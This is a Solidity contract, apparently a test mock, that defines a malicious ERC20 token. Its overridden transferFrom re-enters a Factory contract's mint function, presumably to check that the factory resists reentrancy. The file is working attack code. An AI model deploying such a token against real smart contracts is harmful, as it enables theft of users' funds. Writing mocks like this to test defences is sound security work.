// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./../Factory.sol";

contract Reentrancy is ERC20 {
    address public reentrantFactory;

    constructor(address _reentrantFactory) ERC20("ReentrancyAttack", "REAT")
    {
        reentrantFactory = _reentrantFactory;
        _mint(address(this), type(uint256).max);
    }

    function attackMint() public {
        IERC20(address(this)).approve(address(reentrantFactory), type(uint256).max);
        Factory(reentrantFactory).mint(42, address(this));
    }

    function transferFrom(address from, address to, uint256 value) public virtual override returns (bool) {
        Factory(reentrantFactory).mint(42, address(this));
    }
}